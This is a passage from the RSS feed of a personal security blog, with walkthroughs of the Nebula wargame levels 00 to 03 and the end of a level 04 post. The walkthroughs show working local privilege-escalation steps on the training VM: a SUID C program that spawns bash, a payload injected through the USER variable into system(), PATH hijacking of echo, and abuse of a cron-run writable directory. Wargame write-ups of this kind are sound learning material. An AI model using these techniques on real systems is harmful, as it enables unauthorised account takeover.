&lt;p&gt;The only odd part about this challenge is that there&amp;rsquo;s apparently no privilege escalation done, so you can run &amp;ldquo;getflag&amp;rdquo;, like every other problem up until now. &lt;a href=&#34;http://exploit-exercises.com/nebula/level04#comment-375659125&#34;&gt;Someone else&lt;/a&gt; noticed the same thing, but there has been no answer.  So as far as I&amp;rsquo;m concerned, this challenge is complete. We got the contents of the token file.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 03</title>
      <link>https://www.mattandreko.com/2011/12/04/exploit-exercises---nebula-03/</link>
      <pubDate>Sun, 04 Dec 2011 15:22:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/04/exploit-exercises---nebula-03/</guid>
      <description>&lt;p&gt;In &lt;a href=&#34;http://exploit-exercises.com/nebula/level03&#34;&gt;this&lt;/a&gt; challenge, we can see that there&amp;rsquo;s no code for us to exploit, it&amp;rsquo;s something in the system.
I log in to the system, and look in the /home/flag03 folder, as all the other challenges have started.  I see there&amp;rsquo;s a writable.sh script, which I was guessing was the script getting called on a crontab every couple minutes.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It contained:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
        rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this script looks like it will execute anything in the writable.d folder that we put in there.  And after some tinkering, I can see that it&amp;rsquo;s running it as the flag03 user that we want to escalate to.&lt;/p&gt;

&lt;p&gt;My first thoughts were to create a bash script like previous challenges, and have it get created with SUID permissions.  However this didn&amp;rsquo;t work, because apparently bash ignores the SUID bit, for security reasons.  I then read up on using perl, but couldn&amp;rsquo;t get it to work, due to perl&amp;rsquo;s built in protection.  Lastly, I settled on just good old C/C++. I spent forever messing around with this, because I was always setting the uid, but never the euid. When I forgot that, it would run bash, but I&amp;rsquo;d be the same user. I created this source file, and saved it to /tmp/level03.c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
    setresuid(996, 996, 996);
    setresgid(996, 996, 996);
    system( &amp;quot;/bin/bash&amp;quot; );
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NOTE: The &amp;ldquo;996&amp;rdquo; is the userid and groupid for flag03.  I found this by just doing&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ cat /etc/passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that I have a source file, I need to get the flag03 user to compile it, and mark it SUID, so that when it runs, it works as the user specified.  I did it by using the following command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ echo -e &#39;gcc -o /home/flag03/level03 /tmp/level03.c;chmod +s,a+rwx /home/flag03/level03&#39; &amp;gt; /home/flag03/writable.d/bash; chmod +x /home/flag03/writable.d/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will create a bash script to get picked up by the cron job.  It first compiles the /tmp/level03.c code file and outputs the binary to /home/flag03/level03.  Afterwards it sets the permissions to allow executing (and more technically) as well as SUID.  After this command, I had to wait a couple minutes for it to get picked up by the cron job, but then I ran it, and got access to flag03.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ ./level03
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 02</title>
      <link>https://www.mattandreko.com/2011/12/03/exploit-exercises---nebula-02/</link>
      <pubDate>Sat, 03 Dec 2011 08:13:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/03/exploit-exercises---nebula-02/</guid>
      <description>&lt;p&gt;In &lt;a href=&#34;http://exploit-exercises.com/nebula/level02&#34;&gt;this&lt;/a&gt; challenge, we&amp;rsquo;re again provided with the source code to the vulnerable program.  Only this time, they&amp;rsquo;re not loading the &amp;ldquo;echo&amp;rdquo; program from the environment&amp;rsquo;s path.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
 char *buffer;

 gid_t gid;
 uid_t uid;

 gid = getegid();
 uid = geteuid();

 setresgid(gid, gid, gid);
 setresuid(uid, uid, uid);

 buffer = NULL;

 asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
 printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);

 system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What I did initially notice here, is that the &amp;ldquo;USER&amp;rdquo; variable is being called directly from the environment.  This makes it very similar to the previous challenge.  I luckily got this one on my first try.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level02@nebula:/home/flag02$ USER=&#39;-e &amp;quot;#!/bin/bash\n/bin/bash&amp;quot; &amp;gt; /tmp/level02; chmod +x /tmp/level02; /tmp/level02&#39;
level02@nebula:/home/flag02$ export USER
level02@nebula:/home/flag02$ ./flag02
about to call system(&amp;quot;/bin/echo -e &amp;quot;#!/bin/bash\n/bin/bash&amp;quot; &amp;gt; /tmp/level02; chmod +x /tmp/level02; /tmp/level02 is cool&amp;quot;)
flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What we&amp;rsquo;re doing here, is injecting code into the echo command.  This, like the last challenge, makes a bash script at /tmp/level02 which will ignore any other parameters.  It then marks it executable so we can actually execute it.  Then it executes the bash script.&lt;/p&gt;

&lt;p&gt;Often times in situations like this, the bash script wouldn&amp;rsquo;t be needed, but since the &amp;ldquo; is cool&amp;rdquo; is following the execution, it needs to handle that.  A bash script lets it get ignored, where passing it as a parameter to /bin/bash would try to execute it.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m guessing there may be an easier way than creating the bash script.  Maybe a way to comment out the rest of the line?  I&amp;rsquo;m not sure, but I know this method worked great for me.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 01</title>
      <link>https://www.mattandreko.com/2011/12/02/exploit-exercises---nebula-01/</link>
      <pubDate>Fri, 02 Dec 2011 06:18:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/02/exploit-exercises---nebula-01/</guid>
      <description>&lt;p&gt;Continuing from my previous post, I started tinkering with the next Nebula wargame: &lt;a href=&#34;http://exploit-exercises.com/nebula/level01&#34;&gt;Nebula 01&lt;/a&gt;. This one gives you some C code, which has a bug in it. You have to exploit that bug.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
 gid_t gid;
 uid_t uid;
 gid = getegid();
 uid = geteuid();

 setresgid(gid, gid, gid);
 setresuid(uid, uid, uid);

 system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you read through the code, you may notice that it&amp;rsquo;s calling &amp;ldquo;echo&amp;rdquo; with some text appended, to echo it to the screen. How it&amp;rsquo;s being called, it is loading the path to &amp;ldquo;echo&amp;rdquo; from the environment settings. It&amp;rsquo;ll read what&amp;rsquo;s in the path. To exploit this, all we have to do is modify the path.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level01@nebula:/home/flag01$ PATH=/tmp:$PATH
level01@nebula:/home/flag01$ export PATH
level01@nebula:/home/flag01$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, if &amp;ldquo;echo&amp;rdquo; is called, it&amp;rsquo;ll look in /tmp first. So let&amp;rsquo;s start tinkering. My first thought was to just make a symbolic link to /bin/bash, to get me a shell.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level01@nebula:/home/flag01$ ln -s /bin/bash /tmp/echo
level01@nebula:/home/flag01$ ./flag01
echo: and: No such file or directory
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, that didn&amp;rsquo;t work, because it was essentially calling bash with the parameters of &amp;ldquo;and now what?&amp;rdquo;. To get around that, I figured I&amp;rsquo;d wrap it in a bash script, which just ignored any parameters. I deleted the /tmp/echo file I created, and tried over.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level01@nebula:/home/flag01$ rm /tmp/echo
level01@nebula:/home/flag01$ ln -s /bin/bash /tmp/echo2
level01@nebula:/home/flag01$ echo -e &#39;#!/bin/bash\n/tmp/echo2&#39; &amp;gt; /tmp/echo;chmod +x /tmp/echo
level01@nebula:/home/flag01$ ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time it was successful, so I again, ran &amp;ldquo;getflag&amp;rdquo;.  Now I have another level complete.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 00</title>
      <link>https://www.mattandreko.com/2011/12/01/exploit-exercises---nebula-00/</link>
      <pubDate>Thu, 01 Dec 2011 06:40:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2011/12/01/exploit-exercises---nebula-00/</guid>
      <description>&lt;p&gt;Recently, I&amp;rsquo;ve been getting more and more back into computer security, one of my favorite topics. Part of this is research, and part is more practical, such as wargames or labs. One newer wargame that I&amp;rsquo;ve been playing is called &amp;ldquo;Nebula&amp;rdquo;, from the guys over at &lt;a href=&#34;http://exploit-exercises.com&#34;&gt;Exploit-Exercises&lt;/a&gt;. If you&amp;rsquo;re interested in security, please check out their site, as well as many other wargames. If this goes successfully, perhaps I&amp;rsquo;ll start going through my notes of otherwargames, publishing them as well.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;For &lt;a href=&#34;http://exploit-exercises.com/nebula/level00&#34;&gt;level 00&lt;/a&gt;, it&amp;rsquo;s fairly introductory. You&amp;rsquo;re supposed to find a SUID program, that you can run as the &amp;ldquo;flag00&amp;rdquo; user. I read a little on the find manual, since I don&amp;rsquo;t use the more advanced features often, and came up with this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ find / -executable -user flag00 2&amp;gt; /dev/null
/home/flag00
/bin/.../flag00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This find command, should show all files that are executable and owned by the user &amp;ldquo;flag00&amp;rdquo;. The &amp;ldquo;2&amp;gt; /dev/null&amp;rdquo; is just to redirect the standard error output to null, so I don&amp;rsquo;t see all the &amp;ldquo;Permission Denied&amp;rdquo; errors.  &lt;br /&gt;It looks like it found the flag00 user&amp;rsquo;s home folder, as well as an executable hidden in /bin/&amp;hellip;/. I then executed it, which granted me access to the flag00 user. From there, I ran the &amp;ldquo;getflag&amp;rdquo; command, which I don&amp;rsquo;t think actually does anything on this VM, but oh well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, the first level down.  It was trivial, but still a good learning experience.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>